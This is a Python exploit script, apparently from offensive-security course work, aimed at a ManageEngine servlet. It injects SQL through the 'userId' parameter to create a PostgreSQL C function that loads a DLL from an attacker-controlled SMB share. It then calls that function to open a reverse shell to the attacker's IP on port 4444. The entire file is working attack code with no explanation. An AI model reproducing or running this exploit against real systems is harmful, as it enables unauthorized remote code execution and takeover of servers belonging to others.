import requests, sys
requests.packages.urllib3.disable_warnings()

def make_request(url):
   print("[*] Executing query: {0}".format(url))
   r = requests.get(url, verify=False)
   return r

def create_udf_func(sqli_url):
   print("[+] Creating function...")
   sql = 'CREATE OR REPLACE FUNCTION rev_shell(text, integer) RETURNS void AS $$\\\\192.168.119.147\\awae\\reverse.dll$$,$$connect_back$$ LANGUAGE C STRICT'
   url = sqli_url.format(sql)
   make_request(url)

def trigger_udf(sqli_url, ip, port):
   print("[+] Launching reverse shell...")
   sql = "select rev_shell($${0}$$, {1})".format(ip,port)
   url = sqli_url.format(sql)
   make_request(url)
    
if __name__ == '__main__':

   attacker = '192.168.119.147'
   port = 4444

   sqli_url  = "https://manageengine:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;{0};--"
   create_udf_func(sqli_url)
   trigger_udf(sqli_url, attacker, port)

